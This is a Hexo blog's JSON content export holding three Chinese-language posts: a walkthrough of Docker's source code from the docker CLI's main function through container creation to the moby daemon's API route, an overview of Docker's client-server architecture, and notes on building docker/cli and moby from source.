{"meta":{"title":"Plucky","subtitle":"Comfortably Numb","description":"记录","author":"Plucky","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2022-06-23T08:09:59.000Z","updated":"2023-03-01T09:00:29.431Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"饥饿艺术家"},{"title":"categories","date":"2022-06-23T11:37:54.000Z","updated":"2022-06-23T11:44:50.961Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-06-23T11:37:08.000Z","updated":"2022-06-23T11:42:25.423Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"links","date":"2023-03-31T04:34:08.000Z","updated":"2023-05-12T13:02:28.648Z","comments":true,"path":"links/index.html","permalink":"http://example.com/links/index.html","excerpt":"","text":"Friend Link Solar1s Hammour Placebo"}],"posts":[{"title":"docker 源码分析 从client到daemon","slug":"docker-源码分析-从client到daemon","date":"2024-01-12T08:31:44.000Z","updated":"2024-01-13T05:22:52.089Z","comments":true,"path":"2024/01/12/docker-源码分析-从client到daemon/","link":"","permalink":"http://example.com/2024/01/12/docker-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%BB%8Eclient%E5%88%B0daemon/","excerpt":"docker client入口maincli&#x2F;cmd&#x2F;docker&#x2F;docker.go at master · docker&#x2F;cli (github.com)","text":"docker client入口maincli&#x2F;cmd&#x2F;docker&#x2F;docker.go at master · docker&#x2F;cli (github.com) 123456789101112131415161718192021222324func main() &#123; dockerCli, err := command.NewDockerCli() if err != nil &#123; fmt.Fprintln(os.Stderr, err) os.Exit(1) &#125; logrus.SetOutput(dockerCli.Err()) if err := runDocker(dockerCli); err != nil &#123; if sterr, ok := err.(cli.StatusError); ok &#123; if sterr.Status != &quot;&quot; &#123; fmt.Fprintln(dockerCli.Err(), sterr.Status) &#125; // StatusError should only be used for errors, and all errors should // have a non-zero exit status, so never exit with 0 if sterr.StatusCode == 0 &#123; os.Exit(1) &#125; os.Exit(sterr.StatusCode) &#125; fmt.Fprintln(dockerCli.Err(), err) os.Exit(1) &#125;&#125; 这部分代码的主要工作是： 生成一个带有输入输出的客户端对象 根据dockerCli客户端对象，解析命令行参数，生成带有命令行参数及客户端配置信息的cmd命令行对象 根据输入参数args完成命令执行 NewDockerClicli&#x2F;cli&#x2F;command&#x2F;cli.go at master · docker&#x2F;cli (github.com) 1234567891011121314151617// NewDockerCli returns a DockerCli instance with all operators applied on it.// It applies by default the standard streams, and the content trust from// environment.func NewDockerCli(ops ...CLIOption) (*DockerCli, error) &#123; defaultOps := []CLIOption&#123; WithContentTrustFromEnv(), WithDefaultContextStoreConfig(), WithStandardStreams(), &#125; ops = append(defaultOps, ops...) cli := &amp;DockerCli&#123;baseCtx: context.Background()&#125; if err := cli.Apply(ops...); err != nil &#123; return nil, err &#125; return cli, nil&#125; WithStandardStreams()函数，将标准输入，输出，错误放入Ops中，然后返回一个cli，也就是上面所说的dockerCli,然后进入到runDocker函数中 runDockercli&#x2F;cmd&#x2F;docker&#x2F;docker.go at master · docker&#x2F;cli (github.com) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546func runDocker(dockerCli *command.DockerCli) error &#123; tcmd := newDockerCommand(dockerCli) cmd, args, err := tcmd.HandleGlobalFlags() if err != nil &#123; return err &#125; if err := tcmd.Initialize(); err != nil &#123; return err &#125; var envs []string args, os.Args, envs, err = processAliases(dockerCli, cmd, args, os.Args) if err != nil &#123; return err &#125; if cli.HasCompletionArg(args) &#123; // We add plugin command stubs early only for completion. We don&#x27;t // want to add them for normal command execution as it would cause // a significant performance hit. err = pluginmanager.AddPluginCommandStubs(dockerCli, cmd) if err != nil &#123; return err &#125; &#125; if len(args) &gt; 0 &#123; ccmd, _, err := cmd.Find(args) if err != nil || pluginmanager.IsPluginCommand(ccmd) &#123; err := tryPluginRun(dockerCli, cmd, args[0], envs) if !pluginmanager.IsNotFound(err) &#123; return err &#125; // For plugin not found we fall through to // cmd.Execute() which deals with reporting // &quot;command not found&quot; in a consistent way. &#125; &#125; // We&#x27;ve parsed global args already, so reset args to those // which remain. cmd.SetArgs(args) return cmd.Execute()&#125; 首先通过newDockerCommand()实例化一个顶级命令（即 docker XXX）； 通过HandleGlobalFlags()对顶级命令做一些配置；其作用主要是将tcmd中的顶级命令及后面的参数取出来，以docker ps -a为例，cmd 就是docker命令，而返回为args则包含了ps -a。 通过Initialize()对顶级命令初始化，主要涉及配置文件方面； 通过processAliases()处理命令别名； 通过Find() 判断顶级命令后的 根命令是否合规。例如：是不是在不该加参数的命令后面加了参数，是不是输入了根本不存在命令等。 最终通过Execute()开始执行顶级命令 newDockerCommandcli&#x2F;cmd&#x2F;docker&#x2F;docker.go at master · docker&#x2F;cli (github.com) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950func newDockerCommand(dockerCli *command.DockerCli) *cli.TopLevelCommand &#123; var ( opts *cliflags.ClientOptions helpCmd *cobra.Command ) cmd := &amp;cobra.Command&#123; Use: &quot;docker [OPTIONS] COMMAND [ARG...]&quot;, Short: &quot;A self-sufficient runtime for containers&quot;, SilenceUsage: true, SilenceErrors: true, TraverseChildren: true, RunE: func(cmd *cobra.Command, args []string) error &#123; if len(args) == 0 &#123; return command.ShowHelp(dockerCli.Err())(cmd, args) &#125; return fmt.Errorf(&quot;docker: &#x27;%s&#x27; is not a docker command.\\nSee &#x27;docker --help&#x27;&quot;, args[0]) &#125;, PersistentPreRunE: func(cmd *cobra.Command, args []string) error &#123; return isSupported(cmd, dockerCli) &#125;, Version: fmt.Sprintf(&quot;%s, build %s&quot;, version.Version, version.GitCommit), DisableFlagsInUseLine: true, CompletionOptions: cobra.CompletionOptions&#123; DisableDefaultCmd: false, HiddenDefaultCmd: true, DisableDescriptions: true, &#125;, &#125; cmd.SetIn(dockerCli.In()) cmd.SetOut(dockerCli.Out()) cmd.SetErr(dockerCli.Err()) opts, helpCmd = cli.SetupRootCommand(cmd) _ = registerCompletionFuncForGlobalFlags(dockerCli.ContextStore(), cmd) cmd.Flags().BoolP(&quot;version&quot;, &quot;v&quot;, false, &quot;Print version information and quit&quot;) setFlagErrorFunc(dockerCli, cmd) setupHelpCommand(dockerCli, cmd, helpCmd) setHelpFunc(dockerCli, cmd) cmd.SetOut(dockerCli.Out()) commands.AddCommands(cmd, dockerCli) cli.DisableFlagsInUseLine(cmd) setValidateArgs(dockerCli, cmd) // flags must be the top-level command flags, not cmd.Flags() return cli.NewTopLevelCommand(cmd, dockerCli, opts, cmd.Flags())&#125; 在newDockerCommand()中会首先实例化一个cmd，cmd中有一个RunE字段，该字段为函数类型，这是docker命令默认执行的逻辑，如果docker 后面不加参数，默认会显示help, 而实际执行时，确实是显示了help信息。 1234567891011121314151617181920212223cmd := &amp;cobra.Command&#123; Use: &quot;docker [OPTIONS] COMMAND [ARG...]&quot;, Short: &quot;A self-sufficient runtime for containers&quot;, SilenceUsage: true, SilenceErrors: true, TraverseChildren: true, RunE: func(cmd *cobra.Command, args []string) error &#123; if len(args) == 0 &#123; return command.ShowHelp(dockerCli.Err())(cmd, args) &#125; return fmt.Errorf(&quot;docker: &#x27;%s&#x27; is not a docker command.\\nSee &#x27;docker --help&#x27;&quot;, args[0]) &#125;, PersistentPreRunE: func(cmd *cobra.Command, args []string) error &#123; return isSupported(cmd, dockerCli) &#125;, Version: fmt.Sprintf(&quot;%s, build %s&quot;, version.Version, version.GitCommit), DisableFlagsInUseLine: true, CompletionOptions: cobra.CompletionOptions&#123; DisableDefaultCmd: false, HiddenDefaultCmd: true, DisableDescriptions: true, &#125;, &#125; 在cmd实例创建之后，会对该实例进行一些配置，如：添置一些模板函数，错误处理，帮助信息打印等。 这里要提一下github.com/spf13/cobra库的工作原理。github.com/spf13/cobra库将一个命令行工具的所有命令抽象为一个层次结构，最上层为根命令，每个命令又可以定义它的子命令。每个命令在定义时可设置它的描述性文字，支持的选项、用法描述、命令的执行逻辑、相关模板等。用户执行命令行时，会根据命令行参数自动查找对应的命令，然后就可以运行该命令的执行逻辑了。详细用法可参阅github.com/spf13/cobra库的文档 AddCommandsnewDockerCommand()中另一个重要的函数是AddCommands()，该函数会将所有的根命令（例如，ps 、image、 build等等 ），添加至cmd中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// AddCommands adds all the commands from cli/command to the root commandfunc AddCommands(cmd *cobra.Command, dockerCli command.Cli) &#123; cmd.AddCommand( // commonly used shorthands container.NewRunCommand(dockerCli), container.NewExecCommand(dockerCli), container.NewPsCommand(dockerCli), image.NewBuildCommand(dockerCli), image.NewPullCommand(dockerCli), image.NewPushCommand(dockerCli), image.NewImagesCommand(dockerCli), registry.NewLoginCommand(dockerCli), registry.NewLogoutCommand(dockerCli), registry.NewSearchCommand(dockerCli), system.NewVersionCommand(dockerCli), system.NewInfoCommand(dockerCli), // management commands builder.NewBuilderCommand(dockerCli), checkpoint.NewCheckpointCommand(dockerCli), container.NewContainerCommand(dockerCli), context.NewContextCommand(dockerCli), image.NewImageCommand(dockerCli), manifest.NewManifestCommand(dockerCli), network.NewNetworkCommand(dockerCli), plugin.NewPluginCommand(dockerCli), system.NewSystemCommand(dockerCli), trust.NewTrustCommand(dockerCli), volume.NewVolumeCommand(dockerCli), // orchestration (swarm) commands config.NewConfigCommand(dockerCli), node.NewNodeCommand(dockerCli), secret.NewSecretCommand(dockerCli), service.NewServiceCommand(dockerCli), stack.NewStackCommand(dockerCli), swarm.NewSwarmCommand(dockerCli), // legacy commands may be hidden hide(container.NewAttachCommand(dockerCli)), hide(container.NewCommitCommand(dockerCli)), hide(container.NewCopyCommand(dockerCli)), hide(container.NewCreateCommand(dockerCli)), hide(container.NewDiffCommand(dockerCli)), hide(container.NewExportCommand(dockerCli)), hide(container.NewKillCommand(dockerCli)), hide(container.NewLogsCommand(dockerCli)), hide(container.NewPauseCommand(dockerCli)), hide(container.NewPortCommand(dockerCli)), hide(container.NewRenameCommand(dockerCli)), hide(container.NewRestartCommand(dockerCli)), hide(container.NewRmCommand(dockerCli)), hide(container.NewStartCommand(dockerCli)), hide(container.NewStatsCommand(dockerCli)), hide(container.NewStopCommand(dockerCli)), hide(container.NewTopCommand(dockerCli)), hide(container.NewUnpauseCommand(dockerCli)), hide(container.NewUpdateCommand(dockerCli)), hide(container.NewWaitCommand(dockerCli)), hide(image.NewHistoryCommand(dockerCli)), hide(image.NewImportCommand(dockerCli)), hide(image.NewLoadCommand(dockerCli)), hide(image.NewRemoveCommand(dockerCli)), hide(image.NewSaveCommand(dockerCli)), hide(image.NewTagCommand(dockerCli)), hide(system.NewEventsCommand(dockerCli)), hide(system.NewInspectCommand(dockerCli)), )&#125; 可以看到这里定义了很多子命令，并添加为根命令的子命令，每个子命令构建时都将DockerCli对象传入了。同样为了保证兼容性的，对其它不少子命令用的hide函数对原有命令进行了处理，将其Hidden属性设置为了true。 然后回到newDockerCommand，最终通过 NewTopLevelCommand()将cmd封装为一个顶级命令并返回。然后继续看到runDocker,最会调用Execute() ExecuteExecute执行的是AddCommands中的命令，以docker create为例，下面执行的代码是NewCreateCommand NewCreateCommandcli&#x2F;cli&#x2F;command&#x2F;container&#x2F;create.go at master · docker&#x2F;cli (github.com) 1234567891011121314151617181920212223242526272829303132333435363738// NewCreateCommand creates a new cobra.Command for `docker create`func NewCreateCommand(dockerCli command.Cli) *cobra.Command &#123; var options createOptions var copts *containerOptions cmd := &amp;cobra.Command&#123; Use: &quot;create [OPTIONS] IMAGE [COMMAND] [ARG...]&quot;, Short: &quot;Create a new container&quot;, Args: cli.RequiresMinArgs(1), RunE: func(cmd *cobra.Command, args []string) error &#123; copts.Image = args[0] if len(args) &gt; 1 &#123; copts.Args = args[1:] &#125; return runCreate(cmd.Context(), dockerCli, cmd.Flags(), &amp;options, copts) &#125;, Annotations: map[string]string&#123; &quot;aliases&quot;: &quot;docker container create, docker create&quot;, &#125;, ValidArgsFunction: completion.ImageNames(dockerCli), &#125; flags := cmd.Flags() flags.SetInterspersed(false) flags.StringVar(&amp;options.name, &quot;name&quot;, &quot;&quot;, &quot;Assign a name to the container&quot;) flags.StringVar(&amp;options.pull, &quot;pull&quot;, PullImageMissing, `Pull image before creating (&quot;`+PullImageAlways+`&quot;, &quot;|`+PullImageMissing+`&quot;, &quot;`+PullImageNever+`&quot;)`) flags.BoolVarP(&amp;options.quiet, &quot;quiet&quot;, &quot;q&quot;, false, &quot;Suppress the pull output&quot;) // Add an explicit help that doesn&#x27;t have a `-h` to prevent the conflict // with hostname flags.Bool(&quot;help&quot;, false, &quot;Print usage&quot;) command.AddPlatformFlag(flags, &amp;options.platform) command.AddTrustVerificationFlags(flags, &amp;options.untrusted, dockerCli.ContentTrustEnabled()) copts = addFlags(flags) return cmd&#125; docker使用 github.com/spf13/cobra 实现cli功能，NewCreateCommand函数中就定义了cobra.Command。该函数中用户输入的参数经cobra解析后，会被传给runCreate函数。 1234567891011121314151617 cmd := &amp;cobra.Command&#123; Use: &quot;create [OPTIONS] IMAGE [COMMAND] [ARG...]&quot;, Short: &quot;Create a new container&quot;, Args: cli.RequiresMinArgs(1), RunE: func(cmd *cobra.Command, args []string) error &#123; copts.Image = args[0] if len(args) &gt; 1 &#123; copts.Args = args[1:] &#125; return runCreate(cmd.Context(), dockerCli, cmd.Flags(), &amp;options, copts) &#125;, Annotations: map[string]string&#123; &quot;aliases&quot;: &quot;docker container create, docker create&quot;, &#125;, ValidArgsFunction: completion.ImageNames(dockerCli),&#125; runCreatecli&#x2F;cli&#x2F;command&#x2F;container&#x2F;create.go at master · docker&#x2F;cli (github.com) 12345678910111213141516171819202122232425262728293031func runCreate(ctx context.Context, dockerCli command.Cli, flags *pflag.FlagSet, options *createOptions, copts *containerOptions) error &#123; if err := validatePullOpt(options.pull); err != nil &#123; reportError(dockerCli.Err(), &quot;create&quot;, err.Error(), true) return cli.StatusError&#123;StatusCode: 125&#125; &#125; proxyConfig := dockerCli.ConfigFile().ParseProxyConfig(dockerCli.Client().DaemonHost(), opts.ConvertKVStringsToMapWithNil(copts.env.GetAll())) newEnv := []string&#123;&#125; for k, v := range proxyConfig &#123; if v == nil &#123; newEnv = append(newEnv, k) &#125; else &#123; newEnv = append(newEnv, k+&quot;=&quot;+*v) &#125; &#125; copts.env = *opts.NewListOptsRef(&amp;newEnv, nil) containerCfg, err := parse(flags, copts, dockerCli.ServerInfo().OSType) if err != nil &#123; reportError(dockerCli.Err(), &quot;create&quot;, err.Error(), true) return cli.StatusError&#123;StatusCode: 125&#125; &#125; if err = validateAPIVersion(containerCfg, dockerCli.Client().ClientVersion()); err != nil &#123; reportError(dockerCli.Err(), &quot;create&quot;, err.Error(), true) return cli.StatusError&#123;StatusCode: 125&#125; &#125; id, err := createContainer(ctx, dockerCli, containerCfg, options) if err != nil &#123; return err &#125; _, _ = fmt.Fprintln(dockerCli.Out(), id) return nil&#125; createContainercli&#x2F;cli&#x2F;command&#x2F;container&#x2F;create.go at master · docker&#x2F;cli (github.com) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697//nolint:gocyclofunc createContainer(ctx context.Context, dockerCli command.Cli, containerCfg *containerConfig, options *createOptions) (containerID string, err error) &#123; config := containerCfg.Config hostConfig := containerCfg.HostConfig networkingConfig := containerCfg.NetworkingConfig warnOnOomKillDisable(*hostConfig, dockerCli.Err()) warnOnLocalhostDNS(*hostConfig, dockerCli.Err()) var ( trustedRef reference.Canonical namedRef reference.Named ) containerIDFile, err := newCIDFile(hostConfig.ContainerIDFile) if err != nil &#123; return &quot;&quot;, err &#125; defer containerIDFile.Close() ref, err := reference.ParseAnyReference(config.Image) if err != nil &#123; return &quot;&quot;, err &#125; if named, ok := ref.(reference.Named); ok &#123; namedRef = reference.TagNameOnly(named) if taggedRef, ok := namedRef.(reference.NamedTagged); ok &amp;&amp; !options.untrusted &#123; var err error trustedRef, err = image.TrustedReference(ctx, dockerCli, taggedRef) if err != nil &#123; return &quot;&quot;, err &#125; config.Image = reference.FamiliarString(trustedRef) &#125; &#125; pullAndTagImage := func() error &#123; if err := pullImage(ctx, dockerCli, config.Image, options); err != nil &#123; return err &#125; if taggedRef, ok := namedRef.(reference.NamedTagged); ok &amp;&amp; trustedRef != nil &#123; return image.TagTrusted(ctx, dockerCli, trustedRef, taggedRef) &#125; return nil &#125; var platform *specs.Platform // Engine API version 1.41 first introduced the option to specify platform on // create. It will produce an error if you try to set a platform on older API // versions, so check the API version here to maintain backwards // compatibility for CLI users. if options.platform != &quot;&quot; &amp;&amp; versions.GreaterThanOrEqualTo(dockerCli.Client().ClientVersion(), &quot;1.41&quot;) &#123; p, err := platforms.Parse(options.platform) if err != nil &#123; return &quot;&quot;, errors.Wrap(err, &quot;error parsing specified platform&quot;) &#125; platform = &amp;p &#125; if options.pull == PullImageAlways &#123; if err := pullAndTagImage(); err != nil &#123; return &quot;&quot;, err &#125; &#125; hostConfig.ConsoleSize[0], hostConfig.ConsoleSize[1] = dockerCli.Out().GetTtySize() response, err := dockerCli.Client().ContainerCreate(ctx, config, hostConfig, networkingConfig, platform, options.name) if err != nil &#123; // Pull image if it does not exist locally and we have the PullImageMissing option. Default behavior. if errdefs.IsNotFound(err) &amp;&amp; namedRef != nil &amp;&amp; options.pull == PullImageMissing &#123; if !options.quiet &#123; // we don&#x27;t want to write to stdout anything apart from container.ID fmt.Fprintf(dockerCli.Err(), &quot;Unable to find image &#x27;%s&#x27; locally\\n&quot;, reference.FamiliarString(namedRef)) &#125; if err := pullAndTagImage(); err != nil &#123; return &quot;&quot;, err &#125; var retryErr error response, retryErr = dockerCli.Client().ContainerCreate(ctx, config, hostConfig, networkingConfig, platform, options.name) if retryErr != nil &#123; return &quot;&quot;, retryErr &#125; &#125; else &#123; return &quot;&quot;, err &#125; &#125; for _, w := range response.Warnings &#123; _, _ = fmt.Fprintf(dockerCli.Err(), &quot;WARNING: %s\\n&quot;, w) &#125; err = containerIDFile.Write(response.ID) return response.ID, err&#125; 跟踪调用链，来到createContainer函数，如果配置了pull镜像选项，或是第一次创建容器返回镜像不存在，则会先拉取镜像，再调用dockerCli.Client().ContainerCreate方法创建容器。 ContainerCreatecli&#x2F;vendor&#x2F;github.com&#x2F;docker&#x2F;docker&#x2F;client&#x2F;container_create.go at master · docker&#x2F;cli 12345func (cli *Client) ContainerCreate(ctx context.Context, config *container.Config, hostConfig *container.HostConfig, networkingConfig *network.NetworkingConfig, platform *specs.Platform, containerName string) (container.ContainerCreateCreatedBody, error) &#123; ... serverResp, err := cli.post(ctx, &quot;/containers/create&quot;, query, body, nil) ...&#125; api /containers/create 对应 r.postContainersCreate方法。下面就进入到daemon部分 docker daemoninitRoutesmoby&#x2F;api&#x2F;server&#x2F;router&#x2F;container&#x2F;container.go at v24.0.7 · moby&#x2F;moby (github.com) 1234567891011121314151617181920212223242526272829303132333435363738394041// initRoutes initializes the routes in container routerfunc (r *containerRouter) initRoutes() &#123; r.routes = []router.Route&#123; // HEAD router.NewHeadRoute(&quot;/containers/&#123;name:.*&#125;/archive&quot;, r.headContainersArchive), // GET router.NewGetRoute(&quot;/containers/json&quot;, r.getContainersJSON), router.NewGetRoute(&quot;/containers/&#123;name:.*&#125;/export&quot;, r.getContainersExport), router.NewGetRoute(&quot;/containers/&#123;name:.*&#125;/changes&quot;, r.getContainersChanges), router.NewGetRoute(&quot;/containers/&#123;name:.*&#125;/json&quot;, r.getContainersByName), router.NewGetRoute(&quot;/containers/&#123;name:.*&#125;/top&quot;, r.getContainersTop), router.NewGetRoute(&quot;/containers/&#123;name:.*&#125;/logs&quot;, r.getContainersLogs), router.NewGetRoute(&quot;/containers/&#123;name:.*&#125;/stats&quot;, r.getContainersStats), router.NewGetRoute(&quot;/containers/&#123;name:.*&#125;/attach/ws&quot;, r.wsContainersAttach), router.NewGetRoute(&quot;/exec/&#123;id:.*&#125;/json&quot;, r.getExecByID), router.NewGetRoute(&quot;/containers/&#123;name:.*&#125;/archive&quot;, r.getContainersArchive), // POST router.NewPostRoute(&quot;/containers/create&quot;, r.postContainersCreate), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/kill&quot;, r.postContainersKill), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/pause&quot;, r.postContainersPause), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/unpause&quot;, r.postContainersUnpause), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/restart&quot;, r.postContainersRestart), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/start&quot;, r.postContainersStart), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/stop&quot;, r.postContainersStop), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/wait&quot;, r.postContainersWait), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/resize&quot;, r.postContainersResize), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/attach&quot;, r.postContainersAttach), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/copy&quot;, r.postContainersCopy), // Deprecated since 1.8 (API v1.20), errors out since 1.12 (API v1.24) router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/exec&quot;, r.postContainerExecCreate), router.NewPostRoute(&quot;/exec/&#123;name:.*&#125;/start&quot;, r.postContainerExecStart), router.NewPostRoute(&quot;/exec/&#123;name:.*&#125;/resize&quot;, r.postContainerExecResize), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/rename&quot;, r.postContainerRename), router.NewPostRoute(&quot;/containers/&#123;name:.*&#125;/update&quot;, r.postContainerUpdate), router.NewPostRoute(&quot;/containers/prune&quot;, r.postContainersPrune), router.NewPostRoute(&quot;/commit&quot;, r.postCommit), // PUT router.NewPutRoute(&quot;/containers/&#123;name:.*&#125;/archive&quot;, r.putContainersArchive), // DELETE router.NewDeleteRoute(&quot;/containers/&#123;name:.*&#125;&quot;, r.deleteContainers), &#125;&#125; postContainersCreatemoby&#x2F;api&#x2F;server&#x2F;router&#x2F;container&#x2F;container_routes.go at master · moby&#x2F;moby (github.com) 123456789101112func (s *containerRouter) postContainersCreate(ctx context.Context, w http.ResponseWriter, r *http.Request, vars map[string]string) error &#123; ... ccr, err := s.backend.ContainerCreate(types.ContainerCreateConfig&#123; Name: name, Config: config, HostConfig: hostConfig, NetworkingConfig: networkingConfig, AdjustCPUShares: adjustCPUShares, Platform: platform, &#125;) ...&#125; s.backend 初始化为 Daemon 对象，所以跟进Daemon.ContainerCreate。 ContainerCreatemoby&#x2F;daemon&#x2F;create.go at master · moby&#x2F;moby (github.com) 123456// ContainerCreate creates a regular containerfunc (daemon *Daemon) ContainerCreate(ctx context.Context, params backend.ContainerCreateConfig) (containertypes.CreateResponse, error) &#123; return daemon.containerCreate(ctx, daemon.config(), createOpts&#123; params: params, &#125;)&#125; containerCreatemoby&#x2F;daemon&#x2F;create.go at master · moby&#x2F;moby (github.com) 12345func (daemon *Daemon) containerCreate(opts createOpts) (containertypes.ContainerCreateCreatedBody, error) &#123; ... ctr, err := daemon.create(opts) ...&#125; 下面的调用链已经可以一步一步跟了。 参考资料 DOCKER源码分析1 docker client命令行执行流程 - luoyuna - 博客园 (cnblogs.com) docker-cli源码窥探(推荐)_docker_脚本之家 (jb51.net) docker源码分析-Client创建与命令执行-腾讯云开发者社区-腾讯云 (tencent.com) docker container create 流程 源码分析 :: welcome to st0n3’s blog (ssst0n3.github.io)","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"docker 基础架构","slug":"docker-基础架构","date":"2024-01-12T07:57:27.000Z","updated":"2024-01-12T08:12:56.591Z","comments":true,"path":"2024/01/12/docker-基础架构/","link":"","permalink":"http://example.com/2024/01/12/docker-%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/","excerpt":"Docker 使用客户端-服务器架构。Docker 客户端（client） 与 守护进程（Docker daemon） 进行对话，该守护进程 完成了构建、运行和分发 Docker 容器的繁重工作。Docker 客户端和守护进程可以在同一系统上运行，或者您可以将 Docker 客户端连接到远程 Docker 守护进程。Docker 客户端和守护进程在 UNIX 套接字或网络接口上使用 REST API 进行通信。 docker是典型的 c&#x2F;s 架构。 docker client：这里安装的是cli，提供命令行功能。docker&#x2F;cli: The Docker CLI (github.com) docker server：docker具体功能的实现者。也称之为 docker engine、docker daemon。moby&#x2F;moby: The Moby Project - a collaborative project for the container ecosystem to assemble container-based systems (github.com)","text":"Docker 使用客户端-服务器架构。Docker 客户端（client） 与 守护进程（Docker daemon） 进行对话，该守护进程 完成了构建、运行和分发 Docker 容器的繁重工作。Docker 客户端和守护进程可以在同一系统上运行，或者您可以将 Docker 客户端连接到远程 Docker 守护进程。Docker 客户端和守护进程在 UNIX 套接字或网络接口上使用 REST API 进行通信。 docker是典型的 c&#x2F;s 架构。 docker client：这里安装的是cli，提供命令行功能。docker&#x2F;cli: The Docker CLI (github.com) docker server：docker具体功能的实现者。也称之为 docker engine、docker daemon。moby&#x2F;moby: The Moby Project - a collaborative project for the container ecosystem to assemble container-based systems (github.com) docker守护进程Docker 守护进程（dockerd）侦听 Docker API 请求并管理 Docker 对象，例如 images（镜像），containers（容器），networks（网络）和 volume（卷）。守护进程还可以与其他守护进程通信以管理 Docker 服务。 docker客户端Docker 客户端（docker）是许多 Docker 用户与 Docker 交互的主要方式。当您使用诸如docker run 之类的命令时，客户端会将这些命令发送到 dockerd，以执行这些命令。该docker命令使用 Docker API。Docker 客户端可以与多个守护进程通信。 Docker 仓库Docker 仓库存储 Docker 镜像。Docker Hub 是任何人都可以使用的官方公共仓库，并且 Docker 配置为默认在 Docker Hub 上查找镜像。您甚至可以运行自己的私人仓库。如果使用 Docker 数据中心（DDC），则其中包括 Docker 可信仓库（DTR）。 使用 docker pull 或 docker run 命令时，所需的镜像将从配置的仓库中提取。使用 docker push 命令时，会将镜像推送到配置的仓库。 Docker 对象使用 Docker 时，您正在创建和使用镜像（Image），容器（Container），网络（Network），卷（Volume），插件（Plugin）和其他对象。本节是其中一些对象的简要概述。 Images（镜像）镜像是一个只读模板（不包含任何动态数据，其内容在构建之后也不会被改变 ），其中包含创建 Docker 容器的说明。通常，一个镜像基于另一个镜像，并带有一些额外的配置。 例如，你可以建立一个基于 ubuntu 镜像的镜像，安装 ubuntu Apache HTTP Server 和你的应用程序，以及运行你的应用程序所需的配置细节。 您可以创建自己的镜像，也可以仅使用其他人创建并在仓库中发布的镜像。要构建自己的镜像，您可以使用简单的语法创建一个 Dockerfile，以定义创建镜像并运行它所需的步骤。Dockerfile 中的每条指令都会在镜像中创建一个层。更改 Dockerfile 并重建镜像时，仅重建那些已更改的层。与其他虚拟化技术相比，这是使镜像如此轻巧，小型和快速的部分原因。 Containers （容器）容器是镜像的可运行实例。您可以使用 Docker API 或 CLI 创建、启动、停止、移动或删除容器。您可以将容器连接到一个或多个网络，将存储附加到该网络，甚至根据其当前状态创建新镜像。 默认情况下，容器与其他容器及其主机之间的隔离程度相对较高。您可以控制容器的网络、存储或其他基础子系统与其他容器或与主机的隔离程度。 容器由其镜像以及在创建或启动时为其提供的任何配置选项定义。删除容器后，未存储在持久性存储中的状态更改将消失。 按照 Docker 最佳实践的要求，容器不应该向其存储层内写入任何数据，容器存储层要保持无状态化。所有的文件写入操作，都应该使用 Volume（数据卷）、或者挂载宿主目录，在这些位置的读写会跳过容器存储层，直接对宿主（或网络存储）进行读写，其性能和稳定性更高。 Service （服务）服务允许跨多个 Docker 守护进程调度容器，这些守护进程以多个管理者和工作者的集群模式协同工作。集群的每个成员都是一个 Docker 守护进程，并且所有守护进程都使用 Docker API 进行通信。 服务允许您定义所需的状态，例如在任何给定时间必须可用的服务副本数。默认情况下，该服务在所有工作节点之间实现负载平衡。对于使用者而言，Docker 服务似乎是一个单独的应用程序。Docker Engine 在 Docker 1.12 及更高版本中支持集群模式。 参考资料Docker 概述 | Docker 文档 — Docker overview | Docker Docs 一、Docker基础入门及架构介绍 (lixl.cn)","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"docker 从源码编译","slug":"docker-从源码编译","date":"2024-01-11T01:23:32.000Z","updated":"2024-01-12T07:38:51.855Z","comments":true,"path":"2024/01/11/docker-从源码编译/","link":"","permalink":"http://example.com/2024/01/11/docker-%E4%BB%8E%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/","excerpt":"简介自从docker-ce 20.10开始，docker官方公司维护的docker-ce的仓库就已经弃用了。 原本docker-ce的仓库地址为：docker&#x2F;docker-ce","text":"简介自从docker-ce 20.10开始，docker官方公司维护的docker-ce的仓库就已经弃用了。 原本docker-ce的仓库地址为：docker&#x2F;docker-ce 随机docker被拆分为两部分，一部分是cli，用来处理client的部分，也就是解析命令，另一部分是docker engine部分，也就是daemon部分。这两部分对应的仓库分别位于docker cli和docker engine（moby）。 下载后分别处理docker cli和docker engine。 docker cli首先clone docker cli的源码到本地 1git clone git@github.com:docker/cli.git 进入文件夹，切换到需要的分支，运行 1sudo su 1make -f docker.Makefile binary 命令执行完成后，在build目录下可以找到docker二进制文件，然后执行使用该文件 1./docker version 就可以看到docker的输出 如果中间出现了网络的问题，也可以参考下文moby的解决 moby首先clone moby的代码到本地 1git clone https://github.com/moby/moby.git 根据官方文档的要求，我们确保主机上没有安装不需要的docker镜像（其实没啥必要），所以可以使用下面的指令删除镜像 1docker system prune -a 或者 1docker rm $(docker ps -a -q) 删除所有的虚悬镜像(dangling image) 1docker rmi -f $(docker images -q -a -f dangling=true) 